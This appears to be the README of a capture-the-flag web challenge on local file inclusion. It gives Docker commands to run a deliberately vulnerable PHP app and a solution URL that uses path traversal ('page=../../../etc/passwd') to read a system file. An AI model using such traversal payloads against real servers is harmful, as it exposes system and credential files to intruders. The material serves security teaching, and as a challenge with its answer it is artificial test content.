Description: I heard using local files is not secure can you find out why?

### Deployment

```sh
git clone https://github.com/aswinmguptha/mwade-challenges/
cd mwade-challenges/ez-local-files
docker build . -t ez-local-files
docker run -dp 80:80 ez-local-files
```

Visit [http://localhost](http://localhost)

### Solution
Read /etc/passwd by going to
http://localhost/index.php?page=../../../etc/passwd
